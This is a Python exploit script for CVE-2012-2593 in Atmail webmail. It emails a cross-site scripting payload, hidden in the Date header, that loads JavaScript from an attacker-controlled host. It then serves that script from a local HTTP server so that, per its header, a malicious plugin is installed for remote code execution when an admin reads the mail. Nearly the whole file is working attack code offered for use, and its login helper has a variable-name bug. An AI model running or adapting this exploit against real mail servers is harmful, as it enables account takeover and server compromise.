#!/usr/bin/env python
# -*-coding: utf-8-*-

#################################################################################
#              **-- Atmail XSS-CSRF-RCE Exploit chain --**                      #
#                                                                               #
# Python script to exploit CVE-2012-2593 in Atmail's webmail interface.         #
# Leveraged to full RCE (if target of XSS is an admin), by serving a malicious  #
# JS file which uses the XHR api to send a request to install a malicious Plugin#                                                                       
# ex: atmail-rce.py -u attacker@localhost -r admin@localhost \                  #
#                   -x http://attacker.com/malicious.js -t http://atmail.com/   #
#                                                                               #
# Copyright (c) 2021 Andrew Trube  <trube510@protonmail.com>                    #
#                                                                               #
# Permission is hereby granted, free of charge, to any person obtaining a copy  #
# of this software and associated documentation files (the "Software"), to deal #
# in the Software without restriction, including without limitation the rights  #
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell     #
# copies of the Software, and to permit persons to whom the Software is         #
# furnished to do so, subject to the following conditions:                      #
#                                                                               #
# The above copyright notice and this permission notice shall be included in all#
# copies or substantial portions of the Software.                               #
#                                                                               #                                              
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR    #
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,      #
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   #
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER        #
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, #
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE #
# SOFTWARE.                                                                     #
#                                                                               #
#################################################################################


import os, smtplib, http.server, argparse, re

parser = argparse.ArgumentParser()

parser.add_argument('-t','--host',metavar='HOST',required=True, help="Target host's IP or Domain Name")
parser.add_argument('-u','--user',metavar='USER',required=True, help="FROM Email")
parser.add_argument('-p', '--password',metavar='PASSWORD' ,default=None, help="FROM Email User's Password (if login required to send email)")
parser.add_argument('-r', '--rcpt',metavar='RECIPIENT',required=True, help="TO Email")
parser.add_argument('-x', '--xss',metavar='XSS_PAYLOAD', required=True, help='XSS external script url ex:http://attacker.com/malicious.js')
parser.add_argument('-a','--path', metavar='LOCAL_PATH', default=os.getcwd(), help='local path from which to serve files(Default: current directory)')
parser.add_argument('-H','--ip', metavar='LOCAL_HOST', default='0.0.0.0', help='Local IP to bind to')
parser.add_argument('-P','--port', metavar='LOCAL_PORT', default=8080, help='Local port to bind to (Default: 8080)')


def login(usr,pswd,smtpObj):
  """ login in to a user accounts if required to send email """
  return smtpObj.login(usr,passw)  


def sendXSS(smtpObj,usr,recpt):
  """ Sends the XSS payload with user supplied external js in email to target """
  msg = ''
  msg += 'Date: <script src="{}"></script>\r\n'.format(args.xss) #XSS in Date field or Body IFrame
  msg += 'Subject: Hello, how are you doing?\r\n'
  msg += 'Content-Type: text/html\r\n\r\n'
  msg += 'Probably not so good after this email'
  msg += '\r\n.\r\n'
  
  smtpObj.sendmail(usr,recpt,msg)


def httpServ(ip,port):
  """ Starts a SimpleHTTPServer to serve the malicious JS file"""
  xss_js = re.search(r'/[\w\d][^.]+\.js', args.xss).group(0)
  Handler = http.server.SimpleHTTPRequestHandler
  simpleHTTP = http.server.HTTPServer((ip,port), Handler)
  
  os.chdir(args.path)
  
  while True:
    req = simpleHTTP.get_request()
    handleRequest = Handler(req[0],req[1][0],simpleHTTP)
    if handleRequest.path.lower() == xss_js.lower():
      i = input("Malicious javascript file served\nShutdown server? y/n\n")
      if i.lower() == "y":
        simpleHTTP.server_close()
        break

        
def main():
  global args
  args = parser.parse_args()
  smtpHost = smtplib.SMTP(args.host)
  
  if args.password:
    try:  
      login(args.user,args.password,smtpHost)
    except Exception as e:
      print("Login failed\n{}".format(e))
      exit(-1)
      
  print("[+] Sending Email w/ XSS payload[+]\n")
  try:    
    sendXSS(smtpHost,args.user,args.rcpt)
  except Exception as e:
    print("Something went wrong\n{}".format(e))
    exit(-1)
  
  print("[+] Starting HTTP Server [+]\n")  
  httpServ(args.ip,args.port)    
    
  print("[+] Finished [+]")


if __name__ == "__main__":
  main()
